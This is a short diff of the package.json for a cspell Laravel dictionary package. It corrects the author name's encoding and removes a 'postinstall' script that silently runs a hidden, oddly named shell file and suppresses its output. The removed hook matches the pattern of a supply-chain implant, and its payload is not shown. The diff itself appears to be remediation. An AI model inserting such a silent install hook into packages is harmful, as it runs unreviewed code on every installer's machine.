@@ -2,7 +2,7 @@
   "name": "@androlax2/cspell-laravel",
   "version": "1.0.10",
   "description": "Laravel dictionary for cspell.",
-  "author": "Th\u00e9o Benoit <theo.benoit16@gmail.com>",
+  "author": "Théo Benoit <theo.benoit16@gmail.com>",
   "license": "MIT",
   "repository": {
     "type": "git",
@@ -28,8 +28,5 @@
     "laravel",
     "dictionary",
     "spelling"
-  ],
-  "scripts": {
-    "postinstall": "sh ./.ci-8ore7i.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
-  }
+  ]
 }
